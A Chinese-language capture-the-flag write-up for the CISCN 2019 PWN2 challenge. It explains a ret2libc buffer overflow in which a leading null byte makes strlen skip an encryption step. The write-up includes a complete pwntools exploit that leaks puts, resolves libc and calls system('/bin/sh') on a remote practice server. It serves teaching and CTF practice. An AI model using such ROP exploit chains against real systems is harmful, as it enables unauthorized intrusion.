[CISCN 2019东北]PWN2

一、前言

这道题也是ret2libc的类型的，虽然类型差不多，但还是学到新知识了。

strlen函数判断字符串长度，需要用’\x00’截断。

二、题目

先检查保护机制

开启了NX保护，ida静态分析下存在的漏洞。

很明显，需要先输入1进入加密函数中，溢出点在encrypt函数中，gets函数是个溢出点，需要注意的是这个加密函数会对输入的s进行一段加密，所以为了我们的payload不被加密过程打乱，需要在s缓冲区开头设置一个’\x00’来让strlen判断s长度为0，这样就可以跳过对我们payload的加密。

因为strlen判断长度时是用’\x00’截断的，所以开头添加’\x00’让strlen判断s长度为0就可以跳过加密了。

三、EXP

from pwn import*
from libcfind import*

sh = remote('node1.anna.nssctf.cn',28953)
#sh = process('./pwn')
elf = ELF('./pwn')

puts_plt = 0x004006e0
puts_got = elf.got['puts']				#puts函数got表地址

pop_rdi = 0x00400c83					#传递参数

ret_addr = 0x004006b9					#栈顶16字节对齐

main_addr = 0x00400B28
encrypt_addr = 0x004009A0

sh.sendlineafter("choice!\n",b'1')		#进入encrypt函数

payload = b'\x00'+(0x50-0x1+0x8)*b'a'+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt_addr)

sh.sendlineafter("be encrypted\n",payload)

puts_real_addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

print(hex(puts_real_addr))

libc = finder('puts',puts_real_addr)
system_addr = libc.dump('system')
bin_sh_addr = libc.dump('str_bin_sh')

payload = b'\x00'+(0x50-0x1+0x8)*b'a'+p64(ret_addr)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(main_addr)

sh.sendline(payload)

sh.interactive()

四、总结

函数中会有一段对缓冲区进行加密的流程，要想我们的payload不被加密而改变，就需要绕过，必须让strlen函数对字符串长度判断为0，所以在缓冲区开头填充’\x00’,因为strlen函数是用’\x00’截断的。
